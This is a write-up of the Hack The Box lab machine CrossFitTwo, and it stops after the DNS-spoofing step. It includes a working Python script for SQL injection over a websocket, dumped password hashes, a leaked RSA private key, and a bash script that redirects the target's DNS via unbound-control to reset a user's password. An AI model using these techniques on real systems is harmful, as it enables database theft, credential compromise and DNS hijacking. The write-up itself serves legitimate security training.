---
title:     "Hack The Box - CrossFitTwo"
tags: [openbsd,insane,backup,sqli,database,dns,spoofing,node,php,yubikey,suid,ghidra,reversing]
categories: HackTheBox
---
[![info_card](/img/crossfittwo/info_card.png)](/img/crossfittwo/info_card.png)

CrossFitTwo is an insane rated machine on HackTheBox created by [MinatoTW](https://www.hackthebox.eu/home/users/profile/8308) & [polarbearer](https://www.hackthebox.eu/home/users/profile/159204). For the user part we will first discover a websocket connecting to a vhost. This websocket application is vulnerable to SQLI, which let's us retrieve email addresses from users and files on the target system. Using the file read to retrieve the public and private keys necessary to interact with the open unbound dns control service we can spoof the ip for a password reset for the user david. Password reset is sadly disabled but we discover another vhost along the way where we can interact with a chat abusing the control over davids request. Faking the administrator connecting to the chat , we retrieve ssh credentials for the machine. Once on the target, there is a node chatbot application running, where we can inject into the path to load our own module, which results in a reverse shell as another user. This user is in the staff group which can run a custom suid binary `log`. With `log` we can read any file in the `/var` directory and retrieve the  backup of root's ssh key. There is however 2FA with yubikey enabled, but we are able to generate the necessary OTP by also using LogReader to retrieve the yubikey files for root and log in as the root user.
Kudos to my friend [TheCyberGeek](https://www.hackthebox.eu/home/users/profile/114053) for helping me along with some difficulties i had throughout the machine.


# User
## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones.

`All ports`
```
$ sudo nmap -p- -T4 10.129.68.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 16:28 GMT
Nmap scan report for 10.129.68.20
Host is up (0.055s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8953/tcp open  ub-dns-control

Nmap done: 1 IP address (1 host up) scanned in 702.26 seconds
```

`Script and version`
```
$ sudo nmap -p22,80,8953 -sC -sV 10.129.68.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 16:53 GMT
WARNING: Service 10.129.68.20:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
WARNING: Service 10.129.68.20:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
Nmap scan report for 10.129.68.20
Host is up (0.026s latency).

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)
|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)
|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)
80/tcp   open  http                (PHP 7.4.12)
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Connection: close
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Wed, 11 Aug 2021 16:54:33 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|_    <link rel="styleshe
|_http-server-header: OpenBSD httpd
|_http-title: CrossFit
8953/tcp open  ssl/ub-dns-control?
| ssl-cert: Subject: commonName=unbound
| Not valid before: 2021-01-11T07:01:10
|_Not valid after:  2040-09-28T07:01:10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=8/11%Time=6114007D%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,3000,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConnecti
SF:on:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\nDate:\x
SF:\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.mi
SF:n\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                        
Nmap done: 1 IP address (1 host up) scanned in 29.55 seconds
```

## SQLI

There are 3 open ports on the machine, from which http and unbound dns control sound the most interesting. Lacking the necessary information to interact with unbound we start with the webserver.

Opening it up in our browser we see a website for a crossfit club.

[![home](/img/crossfittwo/home.png)](/img/crossfittwo/home.png)

Clicking on the member area it seems we are missing another host in our `/etc/hosts` file.

[![member_area](/img/crossfittwo/member_area.png)](/img/crossfittwo/member_area.png)

And looking at the network tab in firefox we see a websocket connection also failing because of a missing host, so we add `employees.crossfit.htb`, `gym.crossfit.htb` and `crossfit.htb` to our `hosts` file.

[![websocket_vhost](/img/crossfittwo/websocket_vhost.png)](/img/crossfittwo/websocket_vhost.png)

Browsing back to the member area we get greeted with a login window, which also has a password reset feature.

[![pw_reset_home](/img/crossfittwo/pw_reset_home.png)](/img/crossfittwo/pw_reset_home.png)

Adding the websocket, there now is a chatbot on the home page with which we can interact.

[![chatbot](/img/crossfittwo/chatbot.png)](/img/crossfittwo/chatbot.png)

We proxy the traffic through burp to later examine it and click through the chatbot functionality. Entering help we get a list of possible commands.

[![chatbot_help](/img/crossfittwo/chatbot_help.png)](/img/crossfittwo/chatbot_help.png)

Entering memberships we get a list of membership plans for the crossfit club, where we can also check for the availability of this plan.

[![chatbot_memberships](/img/crossfittwo/chatbot_memberships.png)](/img/crossfittwo/chatbot_memberships.png)

[![chatbot_select_plan](/img/crossfittwo/chatbot_select_plan.png)](/img/crossfittwo/chatbot_select_plan.png)

Looking through burp we select the request for the availability, which should be the last one we sent in the WebSockets history and send it to repeater.

[![burp_memberships](/img/crossfittwo/burp_memberships.png)](/img/crossfittwo/burp_memberships.png)

For interacting with it in burp repeater we have to take the token from the last server answer and send it with our request.

[![chatbot_token](/img/crossfittwo/chatbot_token.png)](/img/crossfittwo/chatbot_token.png)

Checking for SQLI in the `params` value we can see that it displays no available membership plan if we enter a query that evaluates to `false`, but displays an availabe membership plan if we change the query to evaluate to `true`. This proofs we have code execution in the SQL query.

[![sqli_poc_1](/img/crossfittwo/sqli_poc_1.png)](/img/crossfittwo/sqli_poc_1.png)

[![sqli_poc_2](/img/crossfittwo/sqli_poc_2.png)](/img/crossfittwo/sqli_poc_2.png)

We can determine the correct amount of columns with union extension and retrieve the output in the debug field if we enter an invalid number for the membership. Selecting `@@version` we can retrieve the version of the backend database.

[![sqli_ver](/img/crossfittwo/sqli_ver.png)](/img/crossfittwo/sqli_ver.png)

To make it more comfortable we can write a short python script to interact with the websocket using the `cmd` module. Since the websocket connection often closes after a certain idle time, we open a new connection for each query and set the current token to the server response. After sending our query we recieve the output and print it to the screen.

`inject.py`
```py
import websocket
import json
from cmd import Cmd

class Read_SQLI(Cmd):
    prompt = "sm1l3z > "

    def __init__(self):
        self.ws = websocket.WebSocket()
        self.token = ''
        Cmd.__init__(self)

    def open_connection(self):
        self.ws.connect('ws://gym.crossfit.htb/ws/')
        response = self.parse_json(self.ws.recv())
        self.token = response['token']

    def parse_json(self, data):
        if data == "ping":
            self.ws.send("pong")
            data = self.ws.recv()
        parsed = json.loads(data)
        return parsed

    def default(self, query):
        self.open_connection()
        payload  = '{"message":"available", "params" : '
        payload += f'''"-1 {query}"'''
        payload += ',"token":"' + self.token + '"}'
        self.ws.send(payload)
        response = self.parse_json(self.ws.recv())
        self.ws.close()
        file_content = response['debug'][17:-1]
        print(file_content)


Read_SQLI().cmdloop()
```

With this we can now easily query the databases and also have a command history. First we look for all available databases.

```
$ python inject.py 
sm1l3z > union select null, group_concat(schema_name) from information_schema.schemata
information_schema,crossfit,employees
```

The `crossfit` db only contains the membership plans, which aren't of much use to us. However the `employees` database contains an `employees` table and a `password_reset` table.

```
sm1l3z > union select null, group_concat(table_name) from information_schema.tables where table_schema = 'crossfit'
membership_plans
sm1l3z > union select null, group_concat(table_name) from information_schema.tables where table_schema = 'employees'
employees,password_reset
```

After querying the column names from the `employees` table we can retrieve all email addresses and password hashes.

```
sm1l3z > union select null, group_concat(column_name) from information_schema.columns where table_name = 'employees'
id,username,password,email
```

```
sm1l3z >  union select null, group_concat(id,' || ', username, ' || ',password, ' || ',email, '\n') from employees.employees
1 || administrator || fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 || david.palmer@crossfit.htb
,2 || wsmith || 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 || will.smith@crossfit.htb
,3 || mwilliams || fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c || maria.williams@crossfit.htb
,4 || jparker || 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 || jack.parker@crossfit.htb
```

Doing the same for the `password_reset` table, we see that it is currently empty.

```
sm1l3z > union select null, group_concat(column_name) from information_schema.columns where table_name = 'password_reset'
email,token,expires
```

```
sm1l3z >  union select null, group_concat(email, ' || ', token , ' || ', expires, '\n') from employees.password_reset
null
```

Sending a password reset request on `http://employees.crossfit.htb/password-reset.php` for the administrator's account with the email `david.palmer@crossfit.htb` and querying it again we can retrieve his token.

[![reset_david](/img/crossfittwo/reset_david.png)](/img/crossfittwo/reset_david.png)

```
sm1l3z >  union select null, group_concat(email, ' || ', token , ' || ', expires, '\n') from employees.password_reset
david.palmer@crossfit.htb || 1def636649113b1b1267ac53fff31043025d95c85a45af38546580d1952c67e8 || 2021-08-11 20:23:24
```

Passing this token as `token` parameter it turns out to be invalid sadly.

[![pw_reset_token](/img/crossfittwo/pw_reset_token.png)](/img/crossfittwo/pw_reset_token.png)

Looking for another way to get into the machine, we see that we can also read files with our discovered SQLI.

```
sm1l3z > union select null, group_concat(load_file('/etc/passwd'))
root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
operator:*:2:5:System &:/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
_identd:*:29:29:identd:/var/empty:/sbin/nologin
_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
_x11:*:35:35:X Server:/var/empty:/sbin/nologin
_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
www:*:67:67:HTTP Server:/var/www:/sbin/nologin
_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
_file:*:104:104:file privsep:/var/empty:/sbin/nologin
_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
node:*:1003:1003::/home/node:/bin/ksh
_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
_redis:*:686:686:redis account:/var/redis:/sbin/nologin
david:*:1004:1004:,,,:/home/david:/bin/csh
john:*:1005:1005::/home/john:/bin/csh
ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
```

Adding a `read_file` function to our script we can now easily read files by prepending `read_file` in our pseudo-shell.

`inject.py`
```py
import websocket
import json
from cmd import Cmd

class Read_SQLI(Cmd):
    prompt = "sm1l3z > "

    def __init__(self):
        self.ws = websocket.WebSocket()
        self.token = ''
        Cmd.__init__(self)

    def open_connection(self):
        self.ws.connect('ws://gym.crossfit.htb/ws/')
        response = self.parse_json(self.ws.recv())
        self.token = response['token']

    def parse_json(self, data):
        if data == "ping":
            self.ws.send("pong")
            data = self.ws.recv()
        parsed = json.loads(data)
        return parsed

    def do_read_file(self, file_name):
        self.open_connection()
        payload  = '{"message":"available", "params" : '
        payload += f'''"-1 union select null, group_concat(load_file('{file_name}'))"'''
        payload += ',"token":"' + self.token + '"}'
        self.ws.send(payload)
        response = self.parse_json(self.ws.recv())
        self.ws.close()
        file_content = response['debug'][17:-1]
        print(file_content)

    def default(self, query):
        self.open_connection()
        payload  = '{"message":"available", "params" : '
        payload += f'''"-1 {query}"'''
        payload += ',"token":"' + self.token + '"}'
        self.ws.send(payload)
        response = self.parse_json(self.ws.recv())
        self.ws.close()
        file_content = response['debug'][17:-1]
        print(file_content)


Read_SQLI().cmdloop()
```

Since we know that unbound dns is running on the machine the `/etc/resolv.conf` might have some interesting information. Retrieving it we see the machine is looking up dns locally.

```
sm1l3z > read_file /etc/resolv.conf
lookup file bind
#nameserver 8.8.8.8
nameserver 127.0.0.1
```

Looking up the `/etc/relayd.conf` we can also retrieve the specific rules for dns-lookup. Interestingly here are the wildcards being used. This means if we send a request with a host header of `{random}employees.crossfit.htb` to the server it will try to look it up with unbound dns. To abuse this the resolving has to happen on our machine, which means we have to interact with the `unbound-control`  on port `8953`.

```
sm1l3z > read_file /etc/relayd.conf
table<1>{127.0.0.1}
table<2>{127.0.0.1}
table<3>{127.0.0.1}
table<4>{127.0.0.1}
http protocol web{
        pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
        pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
        match request path "/*" forward to <1>
        match request path "/ws*" forward to <4>
        http websockets
}

table<5>{127.0.0.1}
table<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
        pass request quick path "/" forward to <5>
        pass request quick path "/index.html" forward to <5>
        pass request quick path "/home" forward to <5>
        pass request quick path "/login" forward to <5>
        pass request quick path "/chat" forward to <5>
        pass request quick path "/js/*" forward to <5>
        pass request quick path "/css/*" forward to <5>
        pass request quick path "/fonts/*" forward to <5>
        pass request quick path "/images/*" forward to <5>
        pass request quick path "/favicon.ico" forward to <5>
        pass forward to <6>
        http websockets
}

relay web{
        listen on "0.0.0.0" port 80
        protocol web
        forward to <1> port 8000
        forward to <2> port 8001
        forward to <3> port 9999
        forward to <4> port 4419
}

relay portal{
        listen on 127.0.0.1 port 9999
        protocol portal
        forward to <5> port 8002
        forward to <6> port 5000 mode source-hash
}
```

To do this we first have to retrieve the configuration file and look for authentication methods. Luckily for us this is in the default place on openbsd.

```
sm1l3z > read_file /var/unbound/etc/unbound.conf
server:
        interface: 127.0.0.1
        interface: ::1
        access-control: 0.0.0.0/0 refuse
        access-control: 127.0.0.0/8 allow
        access-control: ::0/0 refuse
        access-control: ::1 allow
        hide-identity: yes
        hide-version: yes
        msg-cache-size: 0
        rrset-cache-size: 0
        cache-max-ttl: 0
        cache-max-negative-ttl: 0
        auto-trust-anchor-file: "/var/unbound/db/root.key"
        val-log-level: 2
        aggressive-nsec: yes
        include: "/var/unbound/etc/conf.d/local_zones.conf"

remote-control:
        control-enable: yes
        control-interface: 0.0.0.0
        control-use-cert: yes
        server-key-file: "/var/unbound/etc/tls/unbound_server.key"
        server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
        control-key-file: "/var/unbound/etc/tls/unbound_control.key"
        control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
```

We see that authentication happens with a public and private key, so we retrieve all the necessary files to set up `unbound-control` on our machine.

```
sm1l3z > read_file /var/unbound/etc/tls/unbound_server.pem
-----BEGIN CERTIFICATE-----
MIIDoDCCAggCCQDx3ZJ+FQdNnjANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAd1
bmJvdW5kMB4XDTIxMDExMTA3MDExMFoXDTQwMDkyODA3MDExMFowEjEQMA4GA1UE
AwwHdW5ib3VuZDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALaSthKv
1/LXjUfayIL0K3ThP3vs1+PpaPKPiRkj7VYKL3Q3lvHbCEzmjwFxzrYfykbJnrdm
7pgPVGlWbra2ifSfNokVcC/sblub7GXvUKUWbK5Javr7vI8Eljvn9q28ze9FZz6W
1ZojGXSU9M1KU5kslNTnF4sTLcvU9UJGW37Kv/hGqlN8MYFUCM5jOke94rewUuoT
9xw4cveDnMcHwjBlbSQL6R2e7GQWlU/vb1ntDq1nFE3Bu7tK+JD3Ni9Rt7jTfr/u
ezZPuEg/6z1iKtnmXNOCwZGHS5gOdGRQaf4USnjYy7DaSVwXsOQUpZ6tWptolyp9
BrZM3Q1UHG0OZYCNo04i8kL50a9pVggs7Q0TvSqO2KgYMRj78vNzotPE+8FQpj9+
7glV12BQSuh53lNS32WpwTS1yYfvw2sXt/m+BW5Ts6musGj0AANWd6BZAm735qXQ
nt719NzFQsYv0fcFAmbmgXV1X2ZhwZvxJWGDpsyLlNQKjhTWXb4J32hIzwIDAQAB
MA0GCSqGSIb3DQEBCwUAA4IBgQCmHuw7ol3PfJxidmjDkqJtA+Q4OOqgfHHAoq33
pQe2CbQEk50AZMdezxXN0I7ToOkEkXES6BiKDn7FAlOmElCAvYZhVkq7OwgHSECr
tvwiap5exR9W1cFxojz7ufWWpk+2F3RRJhudmaCMlf5KIFMK4BqNt1aHjsM7rshP
jJ3AsELCSgpOVCuc+Jnq+4IzbNNq55oMVq6k5ETsi4TgFew3gJfMEibF5zVbsXMK
A+cpyhRN+XXD0maS+C2BC2a5kGb8jp5otPXDRsJgJWrPb5irGWY9in7w8ZdOMW6v
FcSaLnz9bQ7q93+dbhPFRbjz+QWahvQyw91muwPmkLCB7OLWedha5tfuW1e4WNjt
PCAMbsSgTHsPgrrm0IoK8AfxJht9wE1Dm4XfmXSGgHU6Q7usscoV0dx47m+vmFYZ
Z1faM16lBqfIDDOHm23bIPkO08BH4VaO7HYXlXQY1RGRYH9NJlkR6+lgduK9DkNM
SeJIPkiQql3fH2trxxZ5i4P23Bk=
-----END CERTIFICATE-----
```

```
sm1l3z > read_file /var/unbound/etc/tls/unbound_control.pem
-----BEGIN CERTIFICATE-----
MIIDqDCCAhACCQDWXoAtKiio/DANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAd1
bmJvdW5kMB4XDTIxMDExMTA3MDExM1oXDTQwMDkyODA3MDExM1owGjEYMBYGA1UE
AwwPdW5ib3VuZC1jb250cm9sMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKC
AYEA1iFWNkx522Iel9n5Coc2tnKz2pPc2DPMmcDEvychJNxAYt2eJufh1MjpGSvB
vT7IGDNDVtzioJ0pxKAjMdg+CdyVt05oWt/r5mwBeq8NOUKthX3E+159PybYNZ3p
W5OTqe3Uc6q5rwSpwxOEWUFsirlVc9CJeWYTrU+ORI+V4yNZWKuSuI+wo9KccvDf
rMJAQN2q0b0gX+Bo/PIBeMfJta8QZ5Y5dt5oAEiyIZio0ktQnaAf/Jg9RQ+7HDS8
1e9/rR06iluMRWlQQDuxi8O5wonD9OQFQ+p8D24tnBR/a6kaNfTRsOElisw7sH2t
pyzXm1HUDWfOT3twODd+7ts2SIOrPA9mb1Xlooxtcg1BnwBNNvcmQ729PE3ZfdCv
MauUkgACrv7Xm1TEghHvkyi+RQ/wiIvGsfzcKl+Fb8XTqmOVksQH+L7TLJqwuTjx
kreocUduH/k2L1kBKH2lVoS1RHGrMDChdK33UOA5fqbkvhyqQKmFDgJw0gT8XZSp
5QIJAgMBAAEwDQYJKoZIhvcNAQELBQADggGBABa6nHiCp705OQr6VIYwVBwrli0m
OSYtqqMP/gGZEFsKE3A25zDKxlTO7agdOc9VxT2vAZjYWB3gVTI2dCGOZGqkZDCB
X784yW/5QcDfrEUA2t0nMr1d5cdcKQX2GKtUmZMZg4icHeEihCA3H9Hx1FF3xIww
r36CKvBmT1UXPZk8JBiDurEr8cvjZsQfcKq1gbRPsiDQKXUaSnp1kn+h0j+nEbYE
Qs50nOjbLWLqwXC4Se9fxhpIJREsT2KF9rPeUjvp9SScLkA43nGtXcggVJ0IkG3W
7iLP0eLcM5kwTUA9wJErbLR81skjtoPdMnIkOsH31z4Q775XC9+togBu1ie7u51o
K3zdrp3SNkpbmwZlMVxOqOXHVm+VStciupN85aqOTWBsx+kIF27wj8ti2b1ZwR3K
58q6TDWQpj3p51003I0sMX/t/TCcnZebInuVScyLmP4EQEdLg5kS0y3IeLEcD8z/
2OjsKXq82GFb12+I7fEFcb4PTtv+jG2pkq+ajw==
-----END CERTIFICATE-----
```

```
sm1l3z > read_file /var/unbound/etc/tls/unbound_control.key
-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEA1iFWNkx522Iel9n5Coc2tnKz2pPc2DPMmcDEvychJNxAYt2e
Jufh1MjpGSvBvT7IGDNDVtzioJ0pxKAjMdg+CdyVt05oWt/r5mwBeq8NOUKthX3E
+159PybYNZ3pW5OTqe3Uc6q5rwSpwxOEWUFsirlVc9CJeWYTrU+ORI+V4yNZWKuS
uI+wo9KccvDfrMJAQN2q0b0gX+Bo/PIBeMfJta8QZ5Y5dt5oAEiyIZio0ktQnaAf
/Jg9RQ+7HDS81e9/rR06iluMRWlQQDuxi8O5wonD9OQFQ+p8D24tnBR/a6kaNfTR
sOElisw7sH2tpyzXm1HUDWfOT3twODd+7ts2SIOrPA9mb1Xlooxtcg1BnwBNNvcm
Q729PE3ZfdCvMauUkgACrv7Xm1TEghHvkyi+RQ/wiIvGsfzcKl+Fb8XTqmOVksQH
+L7TLJqwuTjxkreocUduH/k2L1kBKH2lVoS1RHGrMDChdK33UOA5fqbkvhyqQKmF
DgJw0gT8XZSp5QIJAgMBAAECggGAWf3itKlJYUkIYHtMLf+Ln/vu2ILiAr8qUsfw
KAHy7QHf0W0gZWt4vqu9Q0Xfg4BaKcmJmHz2hdfnUOqYP/+Iey6IgWRjeSW4h7uG
l5/wJ8t9D6g+3AHnE15o6Ye3JjSMj5MTgZUTupl0GzcdnUFgs6CWaDkRPcMHrAPO
X8QUk0Qs7ZYV8Jj6/K6r76aJ6pos1NYUT1dzvreaiAvRUIhunnu3okFBX1KzVMM4
keQNt2vNsqE0MD1vKpIk6gLEBglD021sfKjaXsoaxl89TJtn0vZLOe785bGyHp3r
Rey7lZOdpbGhdszE2sXPLv/4gO47Kvlwo98v9Bj1PGW0bZUVoT+QWzGiFjoZpLaP
63TAB7AFW7VPTCbiRugrPLs8ETqV9hvXDLIXm40h9wClzaSVGJDw2wrf8LiL9Zic
ECiMGB0BHjqC0r8Guf9IIPztdtYJKo9vqiC3/tOoySmXfy31Gr9Q0FC3p0nm8gA6
BJ78TV2+NmTMpyPRMNDVamar0u5dAoHBAPQ4KbOlFiTNMPI+dnC+r39r6LeTmMit
CGntqE73UW71t4SV8+EmrsSH78GyTWT0yx1cCYlThzihnXbZbs3Nf3Mtz4U5EHfY
R6gPZN1DO09cagG8afX4aYaYN2B2j3ktsbyvvxQHjZZYHqDGoMrZmOtqLNJ9Ep0t
hC8XJLr41nBPYQPNqJ0zjI5SOUHuZHqSuO8Sse5GD2rAQu7NHjUkuw9dJ2L+eIcr
k4jdZSM/ZXhRQJMn3ElaXvEgL4qeAJ9l4wKBwQDgdZsyXPuB8oTtSdlWZ8WsmXaF
hYZvTOHnqQvGvhUQxm2QiiP0FiYQltUrMGTVHzQagLFJoJlolChO9hYfFnCXXeR2
b3OlRPCqIpKwWcBM6Dh/T2W2Hn63uOdSpuYZck2jzaML0bVbOWbVdN2ScZDqKxKJ
2IHNLnn4buzqtBiTGe248wkHAIzZBkwrX2wqd++a9gqPg/ibKitYWUrUU/557ikI
yabz3vYdnyLLlIxwk7blStSJbV8jZWW+yMM53CMCgcEAgTP1XAVK4c1sx7wkDSHU
1yTPyc9cVU611NTW5nARtRJqNMrga417iJ4iSed66p5XlwDKSszWDS/zjp0Z8ed2
NglWcLTv8XeK8W6zfhvDlQjfTGvR4z+5FGwTYAVZglKaZajU/lPApHmaOpTbHHZi
YKmbbQCeiGk8NW2ZERH04RYdzVVQj1pmUiVOBYOJxQ86p8DMQbLvFRsCTjRWducn
z8kIvWbDfT+gnhgDGdLAbBcQgsnj0Srub8MHY96TlcDhAoHBALHkA0/y6VGfx0HY
WWtlawDTz18a5+Sl5hQXocGtPDzDRmpbUQtN0nUrVV6ZSBCwXjby748OvQZpBVkv
J3ET87/DJiHHSrwc2y+7ns4tE37gPIaJgm7H1F3/KTYUGCDquiWsACCJ31WhNKLP
sBsz7knoQRUGhjj7MKd4IkQQ37kVv5Xo56qpAPevSgbF5Y/y5e7GOLBtQ0aWMSwf
+HI272PrIJJaXvrAJgZr7MOzw2olZ7pph/AywkfnQK/npPHiSQKBwCsSUG0uq8dh
Hz8D1tE7GdpJKPSCzbH69kBly6QZsp7mcaHOXQSIpVJsE94PQFhSHLmEf63ljV1P
Tqob+fMl1zU/1GNcCy8ZG3kcIaO3LnMSgb3eTRHTejQBP32a3JaXBCtJ0FZQkljG
ctYw9KpX23XJmQgoLdDjQjYtp5gsITwJTlVv6fEqXFygRfl5kzfwAgn8m4zi8NyB
B1BfdaJYkNzVBJ9uWoxZfc00PJnEsZRle7tVvaC+gBB0dJuby17hQA==
-----END RSA PRIVATE KEY-----
```


## Unbound dns spoof

First we need to install unbound with apt and stop the service because we will need port `53` udp later to spoof dns.

```
$ sudo apt-get install unbound
$ sudo systemctl stop unbound
```

We then copy all these keys to `/etc/unbound/unbound_server.pem` `/etc/unbound/unbound_control.pem` `/etc/unbound/unbound_control.key` respectivly.

Now we are able to add a forward lookup zone to the target to query every unknown subdomain of `crossfit.htb` from our machine. We pack the unbound command with a curl request to reset the password for david in a small bash script, since both need to happen after one another anyways and the server seems to reset the forward zones again after some time. 

`forward_and_reset.sh`
```bash
#!/bin/bash

unbound-control  -s 10.129.68.20 forward_add +i crossfit.htb 10.10.14.65
curl -i -s -k -XPOST  -H 'Host: sm1l3z.employees.crossfit.htb'  -H 'Content-Type: application/x-www-form-urlencoded' -d 'email=david.palmer%40crossfit.htb' 'http://sm1l3z.employees.crossfit.htb/password-reset.php'
```

Starting wireshark and listening on our vpn interface filtering traffic for dns we execute the script with sudo.

```
sudo ./forward_and_reset.sh
ok
```

